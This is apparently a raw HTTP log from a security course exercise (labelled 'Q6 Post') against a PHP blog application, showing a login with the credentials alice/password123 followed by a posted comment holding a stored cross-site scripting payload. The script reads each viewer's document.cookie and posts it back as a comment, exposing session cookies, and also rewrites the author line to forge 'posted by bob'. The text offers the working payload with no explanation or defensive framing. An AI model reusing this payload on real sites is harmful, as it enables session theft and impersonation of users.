HTTP/1.1 302 Found
Date: Sat, 14 Nov 2020 09:12:21 GMT
Server: Apache/2.2.16 (Debian)
X-Powered-By: PHP/5.3.3-7+squeeze14
Set-Cookie: CS458=rs4tcha6v3dr4lg9iilc75r1n1; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
Pragma: no-cache
Location: index.php
Vary: Accept-Encoding
Content-Length: 18
Content-Type: text/html

alice
password123
HTTP/1.1 100 Continue

HTTP/1.1 302 Found
Date: Sat, 14 Nov 2020 09:12:21 GMT
Server: Apache/2.2.16 (Debian)
X-Powered-By: PHP/5.3.3-7+squeeze14
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
Pragma: no-cache
Location: index.php
Vary: Accept-Encoding
Content-Length: 972
Content-Type: text/html

1
Q6 Post
<script> function xssOne() { var url = window.location.href; var result = url.search(/view\.php\?id=[0-9][0-9]*$/); if(result >= 0) { var x=document.getElementById("author"); var y=x.innerHTML; y=y.replace(/^posted by [a-z]* on/, "posted by bob on"); x.innerHTML = y; } } function getID() {var url = window.location.href;var result = url.search(/view\.php\?id=[0-9][0-9]*$/);if(result >= 0) {url = new URL(url);return url.searchParams.get('id');}} function leakCookies(postID) {var url = window.location.href;var result = url.search(/view\.php\?id=[0-9][0-9]*$/);if(result >= 0) {var cookie = document.cookie;var xhr = new XMLHttpRequest();xhr.open('POST','post.php',true); xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');var str1 = 'comment=';var str3 = '&form=comment&parent=';var str4 = postID.toString();var str5 = '&uid=&submit=Post';var str = str1+cookie+str3+str4+str5; xhr.send(str);}} leakCookies(getID()); xssOne(); </script>
